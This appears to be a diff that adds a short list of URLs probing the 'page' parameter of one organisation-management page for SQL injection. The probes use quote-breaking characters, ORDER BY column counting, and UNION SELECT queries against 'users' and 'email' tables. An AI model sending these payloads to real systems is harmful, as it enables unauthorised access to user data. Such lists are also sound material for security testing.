@@ -1,0 +1,6 @@
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=1
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=%E2%80%9D
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=SELECT%20name%20FROM%20users
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=%E2%80%991
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=1 ORDER BY 1
+https://account.tenant-integration.tcie.pro/manage/team/organization?page=1 UNION ALL SELECT *, NULL, NULL FROM email
